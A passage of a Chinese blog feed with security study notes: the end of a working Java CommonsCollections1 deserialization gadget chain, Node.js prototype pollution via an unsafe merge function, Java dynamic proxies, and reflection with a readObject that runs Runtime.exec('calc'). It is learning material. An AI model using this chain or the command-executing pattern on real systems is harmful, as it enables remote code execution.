java.lang.reflect.Method;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//         InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        Method method = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null &#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(method);</span></span><br><span class="line"><span class="comment">//            new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span> &#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">                &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//chainedTransformer.transform(Runtime.class);</span></span><br><span class="line">         <span class="comment">//Class c = Runtime.class;</span></span><br><span class="line">          <span class="comment">//Method method =  c.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line">          <span class="comment">//Runtime r = (Runtime) method.invoke(null,null); //getRuntime是无参函数</span></span><br><span class="line"><span class="comment">//          Method method1 = c.getMethod(&quot;exec&quot;,String.class);</span></span><br><span class="line"><span class="comment">//          method1.invoke(r,&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//        HashMap hashMap = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        hashMap.put(&quot;value&quot;,&quot;aaa&quot;);</span></span><br><span class="line"><span class="comment">//        Map&lt;Object,Object&gt; map = TransformedMap.decorate(hashMap,null,chainedTransformer);</span></span><br><span class="line"><span class="comment">//////        for (Map.Entry entry:map.entrySet())</span></span><br><span class="line"><span class="comment">//////        &#123;</span></span><br><span class="line"><span class="comment">//////            entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">//////        &#125;</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span>  <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(),h);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class,map);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>最后的话cc1链就全部学完了，也收获了很多</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我是看这个视频来进行学习的 &lt;a href=&quot;https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&amp;amp;vd_source=bacfffe46b930fda5761b63367eb298</summary>
      
    
    
    
    
    <category term="java反序列化 cc1" scheme="https://ke1nys.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1/"/>
    
  </entry>
  
  <entry>
    <title>nodejs-污染</title>
    <link href="https://ke1nys.github.io/posts/1941d3ec.html"/>
    <id>https://ke1nys.github.io/posts/1941d3ec.html</id>
    <published>2023-03-16T11:36:24.000Z</published>
    <updated>2023-04-06T06:48:36.157Z</updated>
    
    <content type="html"><![CDATA[<p>这里我是看p牛的文章来进行学习的，所以下面的内容也是根据p牛的文章来写一点自己的见解</p><p><img src="../images/image-20230316193813743.png" alt="image-20230316193813743"></p><p>这里p牛进行了总结，可以根据p牛写的这个代码来进行理解</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure><p>这里就是在Foo类用了prototype后，那么接下来实例化Foo类的对象，将会有Foo类里面的属性和方法。</p><p>再给一个代码来进行理解上面写的解释</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure><p>就是使用<code>Son.prototype = new Father()</code>后，这里使用了prototype，进行了实例化对象，那么接下来Son类实例化的对象都能拥有Father()类里边的属性和方法</p><p>上面可能就是看p牛文章时会疑惑的点</p><p><img src="../images/image-20230316195653525.png" alt="image-20230316195653525"></p><p>这是p牛总结的</p><p>p牛写的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的作用是将两个对象（<code>target</code> 和 <code>source</code>）进行合并，返回合并后的 <code>target</code> 对象。具体来说，它会将 <code>source</code> 对象中的属性递归地合并到 <code>target</code> 对象中，如果某个属性在 <code>source</code> 对象中存在但在 <code>target</code> 对象中不存在，则直接将该属性赋值给 <code>target</code> 对象。</p><p>这个函数通过使用 <code>for...in</code> 循环遍历 <code>source</code> 对象中的每一个属性，然后使用 <code>if</code> 语句判断该属性是否同时存在于 <code>source</code> 和 <code>target</code> 对象中。如果是，则递归调用 <code>merge</code> 函数，将 <code>source</code> 对象中对应的属性合并到 <code>target</code> 对象中对应的属性上；如果不是，则直接将该属性赋值给 <code>target</code> 对象。</p><p><strong>这是对上面的代码的解释</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里我是看p牛的文章来进行学习的，所以下面的内容也是根据p牛的文章来写一点自己的见解&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230316193813743.png&quot; alt=&quot;image-20230316193813743&quot;&gt;&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    
    <category term="nodejs-污染" scheme="https://ke1nys.github.io/tags/nodejs-%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>java动态代理</title>
    <link href="https://ke1nys.github.io/posts/bcee6ab6.html"/>
    <id>https://ke1nys.github.io/posts/bcee6ab6.html</id>
    <published>2023-03-15T10:18:04.000Z</published>
    <updated>2023-04-06T06:48:36.147Z</updated>
    
    <content type="html"><![CDATA[<p>这个和反射不同的地方在于，这个东西有接口</p><p>这里话进行学习的话得需要四个java代码</p><p><img src="../images/image-20230315183517863.png" alt="image-20230315183517863"></p><p>一个接口和其他三个class</p><p> 这里的IUser是一个接口</p><p><img src="../images/image-20230315190938799.png" alt="image-20230315190938799"></p><p>UserImpl是一个继承于IUser接口,里面重写了IUser接口里的show()方法</p><p><img src="../images/image-20230315190955845.png" alt="image-20230315190955845"></p><p>UserProxy也是一个继承IUser接口，里面也是重写了show方法</p><p><img src="../images/image-20230315191007234.png" alt="image-20230315191007234"></p><p>ProxyTest是个产生代理对象的类</p><p><img src="../images/image-20230315191016626.png" alt="image-20230315191016626"></p><p><strong>在这个产生代理对象的类里边进行操作</strong></p><p><img src="../images/image-20230315190818909.png" alt="image-20230315190818909"></p><p>这里因为UserImpl类是继承了IUser接口，所以这里的类型得定义为IUser.</p><p>然后这里就会调用UserImpl类里边的show方法</p><p><img src="../images/image-20230315191145326.png" alt="image-20230315191145326"></p><p>接下来使用另一个类</p><p><img src="../images/image-20230315191304912.png" alt="image-20230315191304912"></p><p><img src="../images/image-20230315191339554.png" alt="image-20230315191339554"></p><p>这里是会输出两个展示，因为UserProxy里面有一个有参构造函数，传的值是别人传入的对象，因为这里传入的对象是UserImpl的，所以在UserProxy调用show方法时，就会调用到UserImpl类里边的show方法</p><p><strong>以上展示的就是静态代理了</strong></p><p><strong>动态代理</strong></p><p>这里出现的动态代理就是因为静态代理有缺点，因为如果接口里面有很多函数的话，日志(UserImpl)里面也要重写很多函数的方法，代理类(UserProxy)里边也要重写很多类的方法。就会比较繁琐</p><p>这里要实现动态代理的话，就是得想要这个方法</p><p><img src="../images/image-20230315193449922.png" alt="image-20230315193449922"></p><p><img src="../images/image-20230315193502567.png" alt="image-20230315193502567"></p><p>这个方法限定了三个参数，前两个都是写死的，只要是最后一个，这个是关键(就是把想要做的东西传进去)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(),xxx);</span><br></pre></td></tr></table></figure><p>这个xxx就是我们要做的事情</p><p>所以我们得先新建一个类</p><p><img src="../images/image-20230315204047548.png" alt="image-20230315204047548"></p><p><img src="../images/image-20230315204109374.png" alt="image-20230315204109374"></p><p>然后对这个invoke进行重写</p><p><img src="../images/image-20230315204538812.png" alt="image-20230315204538812"></p><p>这里和前面的那个代理类差不多，但是这里用的InvocationHandler这个类，</p><p>这个invoke函数，只要我们能传进来东西，他就会知道我们调用的是哪个方法，这是这个函数的性质</p><p>我们就到代理测试类那边进行调试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserinvocationHandler</span>(user);</span><br><span class="line">        <span class="type">IUser</span> <span class="variable">user1</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(),invocationHandler);</span><br></pre></td></tr></table></figure><p>我们就是利用这个invocationHandler这个类来进行动态代理，所以在new一个对象的时候，我们就用它。</p><p>然后再把实例化后的对象放进下面的Proxy.newProxyInstance里；</p><p><img src="../images/image-20230315205413275.png" alt="image-20230315205413275"></p><p>然后就可以直接调用这个方法了</p><p><img src="../images/image-20230315205707219.png" alt="image-20230315205707219"></p><p>在这个类里边新加这个方法的话，就可以直接调用了了，就不用再去代理类里边重写函数的方法了，这样的话就大大减少了代码量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IUser</span> <span class="variable">user1</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(iUser.getClass().getClassLoader(), iUser.getClass().getInterfaces(),invocationHandler);</span><br></pre></td></tr></table></figure><p>这里的代码也可以写成这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IUser</span> <span class="variable">user1</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(iUser.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;IUser.class&#125;,invocationHandler);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230315210106913.png" alt="image-20230315210106913"></p><p>跟这个有关</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这个和反射不同的地方在于，这个东西有接口&lt;/p&gt;
&lt;p&gt;这里话进行学习的话得需要四个java代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230315183517863.png&quot; alt=&quot;image-20230315183517863&quot;&gt;&lt;/</summary>
      
    
    
    
    
    <category term="java 动态代理" scheme="https://ke1nys.github.io/tags/java-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>java反射</title>
    <link href="https://ke1nys.github.io/posts/e29c8e30.html"/>
    <id>https://ke1nys.github.io/posts/e29c8e30.html</id>
    <published>2023-03-14T14:00:48.000Z</published>
    <updated>2023-04-06T06:48:36.149Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&amp;vd_source=bacfffe46b930fda5761b63367eb298c">这里话是看这篇文章来进行学习的</a></p><p><img src="../images/image-20230314221340100.png" alt="image-20230314221340100"></p><p>上面的就是java反射的作用</p><p>这里的我们在本地自己写一个类来进行测试</p><p><strong>Person.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//构造函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//对Serializable这个接口里的toString函数进行重写</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;,age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//重新对readObject函数进行重写，然后在里面加一条命令执行的语句，这样的话就会在反序列化的时候就会执行，这样的话就会造成安全问题</span></span><br><span class="line">        ois.defaultReadObject();;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>); <span class="comment">//Runtime.getRuntime().exec 用于调用外部可执行程序或系统命令</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在定义一个reflect类来测试，就是在这个reflect类里边进行反射调试</p><p><img src="../images/image-20230314222547749.png" alt="image-20230314222547749"></p><p>在这个类里边，getClass()是得到person对象的Class</p><p>反射的实质就是操控Class</p><p><img src="../images/image-20230314223516379.png" alt="image-20230314223516379"></p><p><strong>这里从class里面实例化对象，方便含有无参和有参的方法</strong></p><p>里面的直接使用<code>c.newInstance();</code>是调用Person类里边的无参构造函数</p><p>使用下面这个代码的话是调用Person类里边的有参构造方法，在<code>c.getConstructor(String.class,int.class);</code>里边的参数，是根据Person类里边设置好的参数来进行填写，因为Person类里边的构造函数是(string,int),</p><p>所以这里就这样填<code>c.getConstructor(String.class,int.class);</code></p><p>最后直接在<code>Person person1 =(Person) constructor.newInstance(&quot;tom&quot;,12);</code>里边输入值，然后使用S.o.p输出就行了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line"><span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span>(Person) constructor.newInstance(<span class="string">&quot;tom&quot;</span>,<span class="number">12</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230314224245408.png" alt="image-20230314224245408"></p><p><strong>获取类里面属性</strong></p><p><img src="../images/image-20230315165736464.png" alt="image-20230315165736464"></p><p>person类里边只有两个属性，一个公开的name,和一个私有的age</p><p><img src="../images/image-20230315165828360.png" alt="image-20230315165828360"></p><p><img src="../images/image-20230315170002571.png" alt="image-20230315170002571"></p><p>getField()方法就是获取属性的方法，属于Field这个类，但是getField()方法只能获取公开属性的方法，<strong>私有属性的使用另一个方法</strong>，下面会继续讲</p><p>这里代码的意思是，先获取person类里边的属性用数组装起来，然后用for循环进行输出</p><p><img src="../images/image-20230315170301659.png" alt="image-20230315170301659"></p><p><img src="../images/image-20230315170308038.png" alt="image-20230315170308038"></p><p>getDeclaredFields();方法就是可以访问私有和公有属性的，其他函数种只要含有Declared的,都是可以访问私有的</p><p>可以获取类里边的属性了，那么我们就可以尝试修改一下这些属性的值了</p><p><img src="../images/image-20230315170925185.png" alt="image-20230315170925185"></p><p><img src="../images/image-20230315170937920.png" alt="image-20230315170937920"></p><p>这就是修改前后的样子</p><p>代码是先获取到person类里边的属性，并确定要修改哪一个属性，这里写的是getField()，没有在末尾加上s，那么没加s的就是可以进行传参来确定要修改的值的，这里传的参数是name，那么我们就可以进行name属性值的修改，然后使用set()方法来确定修改谁的，修改成啥内容，这里添加的对象必须是实例化后的对像，所以是person1</p><p><img src="../images/image-20230315171418567.png" alt="image-20230315171418567"></p><p><strong>上面的代码是修改不了私有属性的</strong></p><p><img src="../images/image-20230315171806679.png" alt="image-20230315171806679"></p><p><img src="../images/image-20230315171818318.png" alt="image-20230315171818318"></p><p>成功进行修改，这里修改的关键就是这两行代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>其他代码的解释和上面说的一样</p><p><strong>接下来是调用类里边的方法</strong></p><p><img src="../images/image-20230315173404879.png" alt="image-20230315173404879"></p><p><img src="../images/image-20230315173513046.png" alt="image-20230315173513046"></p><p>还是和上面那个获取属性的方法一样，使用末尾加s的函数，利用数组来存贮，然后使用for循环输出</p><p>他这里获取的方法有person里边的，还有Object对象的，因为所有的类都继承于他，他是个底层类</p><p><strong>接下来我们换一种写法，不使用数组的写法</strong></p><p><img src="../images/image-20230315174050014.png" alt=""></p><p><img src="../images/image-20230315174116598.png" alt="image-20230315174116598"></p><p><img src="../images/image-20230315174128040.png" alt="image-20230315174128040"></p><p>就是这两个简单的代码，然后就可以访问person类里边的函数方法了，这里的getMethod()方法和那个getConstructor()方法类似，都是必须得告诉一下我们使用的是啥类型的参数。这里的invoke()方法在这里就是触发的意思，就是触发person里边的action方法，这里传的参数和上面的set()是一个意思，就是第一位得传实例化的对象，然后第二位传参数(可以在输出函数名的时候进行查看，idea会告诉你该传什么参数)</p><p><strong>接下来就是调用私有方法</strong></p><p><img src="../images/image-20230315175014198.png" alt="image-20230315175014198"></p><p>这里话是把getMethod换成了getDeclaredMethod，然后加一个可以进行修改的权限，method.setAccessible(true);</p><p><strong>reflect.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.api.model.MEP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflect</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> person.getClass();</span><br><span class="line">        <span class="comment">//从class里面实例化对象</span></span><br><span class="line">        c.newInstance();   <span class="comment">//这个是只能调用person类里边的无参构造函数</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span>(Person) constructor.newInstance(<span class="string">&quot;tom&quot;</span>,<span class="number">12</span>);</span><br><span class="line">        System.out.println(person1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        //获取类里边的属性</span></span><br><span class="line"><span class="comment">//        Field[] fields = 